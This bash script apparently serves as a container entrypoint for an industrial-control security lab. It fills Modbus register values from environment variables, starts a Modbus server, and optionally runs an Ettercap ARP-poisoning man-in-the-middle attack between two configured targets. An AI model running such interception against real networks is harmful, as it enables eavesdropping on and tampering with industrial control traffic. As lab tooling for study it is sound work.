#!/usr/bin/env bash
set -e

# Function to update registers in server_config.json
update_config() {
    local type=$1
    local id=$2
    local value=$3
    local json_path=$4

    echo "Setting $type register $id to $value"
    tmp=$(mktemp)
    jq --arg id "$id" --argjson val "$value" \
       "$json_path[\$id] = \$val" /server_config.json > "$tmp" && mv "$tmp" /server_config.json
    chmod 644 /server_config.json
}

# Process environment variables for registers
# Format: M_COIL_1=true, M_HOLDING_10=1234, etc.
env | grep '^M_' | while read -r line; do
    var_name=$(echo "$line" | cut -d= -f1)
    value=$(echo "$line" | cut -d= -f2-)
    
    # Extract ID from variable name (e.g., M_COIL_1 -> 1)
    id=$(echo "$var_name" | awk -F_ '{print $NF}')
    
    case "$var_name" in
        M_COIL_*)
            update_config "coil" "$id" "$value" ".registers.coils"
            ;;
        M_HOLDING_*)
            update_config "holdingRegister" "$id" "$value" ".registers.holdingRegister"
            ;;
        M_DISCRETE_*)
            update_config "discreteInput" "$id" "$value" ".registers.discreteInput"
            ;;
        M_INPUT_*)
            update_config "inputRegister" "$id" "$value" ".registers.inputRegister"
            ;;
    esac
done

# Start Modbus Server in the background
echo "Starting Modbus Server..."
cd /opt/modbus-server
source .venv/bin/activate
uv run ./src/app/modbus_server.py &
MODBUS_PID=$!

# Wait for Modbus Server to start (simple sleep for now, could be more robust)
sleep 2

# Start Ettercap if configured
if [ -n "$INTERFACE" ] && [ -n "$TARGET1" ] && [ -n "$TARGET2" ]; then
    echo "Starting Ettercap ARP poisoning..."
    echo "Interface: $INTERFACE"
    echo "Target 1: $TARGET1"
    echo "Target 2: $TARGET2"
    
    # Run ettercap in background
    ettercap -i "$INTERFACE" -T -M arp:remote /"$TARGET1"// /"$TARGET2"// &
    ETTERCAP_PID=$!
else
    echo "Ettercap configuration missing (INTERFACE, TARGET1, TARGET2). Skipping ARP poisoning."
fi

# Keep container running and handle signals
# We assign the PIDs to wait on. If ettercap is not running, we just wait on modbus.
pids=("$MODBUS_PID")
if [ -n "$ETTERCAP_PID" ]; then
    pids+=("$ETTERCAP_PID")
fi

# Function to handle termination
cleanup() {
    echo "Stopping services..."
    if [ -n "$ETTERCAP_PID" ]; then
        kill "$ETTERCAP_PID" 2>/dev/null || true
    fi
    kill "$MODBUS_PID" 2>/dev/null || true
    exit 0
}

trap cleanup SIGTERM SIGINT

# Wait for processes
wait "${pids[@]}"
